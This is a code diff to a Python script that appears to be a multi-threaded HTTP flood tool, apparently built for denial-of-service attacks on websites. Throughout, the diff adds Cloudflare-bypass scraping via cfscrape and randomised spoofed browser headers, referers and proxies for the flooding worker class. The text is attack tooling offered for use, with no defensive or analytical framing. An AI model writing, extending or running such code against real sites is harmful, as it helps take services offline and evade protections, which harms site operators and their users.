@@ -3,6 +3,7 @@ import colorama
 from colorama import Fore
 import threading
 import requests
+import cfscrape
 
 	
 useragents = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
@@ -5082,7 +5083,7 @@ google_agents = [
     "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
 ]
 
-
+scraper = cfscrape.create_scraper()
 	
 class fucker(threading.Thread):
     
@@ -5094,7 +5095,13 @@ class fucker(threading.Thread):
         self.Lock = threading.Lock()
         self.proxy = proxy
         self.referers = {'Referers' : random.choice(referers)}
-
+        
+    def request_cloud(self):
+        soso = scraper.get(self.url, timeout=10)
+        
+    def request_default(self):
+        ro = requests.get(self.url, timeout=10, headers={'User-Agent' : random.choice(useragents), 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language' : 'en-US,en;q=0.5', 'Accept-Encoding' : 'gzip, deflate', 'DNT' : '1', 'Referer' : random.choice(referers)})
+        
     def request(self):
         data = None
         proxy = urllib.request.ProxyHandler({'http': self.proxy})
